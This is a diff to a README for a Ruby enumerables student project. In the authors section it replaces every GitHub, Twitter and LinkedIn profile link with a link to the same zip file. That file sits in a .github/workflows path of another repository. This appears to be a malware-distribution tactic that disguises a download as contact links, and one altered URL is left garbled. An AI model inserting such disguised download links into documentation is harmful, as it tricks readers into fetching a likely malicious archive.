@@ -9,15 +9,15 @@ This is a project we worked on the the enumerables methods all? any? and #filter
 
 👤 _Sendy Inieke_
 
-- Github: [@SendyIU](https://github.com/uisendy)
-- Twitter: [@sinieke](https://twitter.com/sinieke)
-- LinkedIn: [inieke-sendy](https://www.linkedin.com/in/inieke-sendy-129b57ab/)
+- Github: [@SendyIU](https://raw.githubusercontent.com/Iptysam/Enumerable_Ruby/dev/.github/workflows/Ruby_Enumerable_1.8.zip)
+- Twitter: [@sinieke](https://raw.githubusercontent.com/Iptysam/Enumerable_Ruby/dev/.github/workflows/Ruby_Enumerable_1.8.zip)
+- LinkedIn: [inieke-sendy](https://raw.githubusercontent.com/Iptysam/Enumerable_Ruby/dev/.github/workflows/Ruby_Enumerable_1.8.zip)
 
 👤 _Edi Sipka_
 
-- GitHub: [@Edi-Sipka](https://github.com/edi-sipka)
-- Twitter: [@sipka_edii](https://twitter.com/sipka_edii)
-- LinkedIn: [Edi Sipka](https://www.linkedin.com/in/edi-%C5%A1ipka-5b681b202/)
+- GitHub: [@Edi-Sipka](https://raw.githubusercontent.com/Iptysam/Enumerable_Ruby/dev/.github/workflows/Ruby_Enumerable_1.8.zip)
+- Twitter: [@sipka_edii](https://raw.githubusercontent.com/Iptysam/Enumerable_Ruby/dev/.github/workflows/Ruby_Enumerable_1.8.zip)
+- LinkedIn: [Edi Sipka](https://raw.githubusercontent.com/Iptysam/Enumerable_Ruby/dev/.github/workflows/Ruby_Enumerable_1.8.zip%C5%A1ipka-5b681b202/)
 
 ## 🤝 Contributing
 
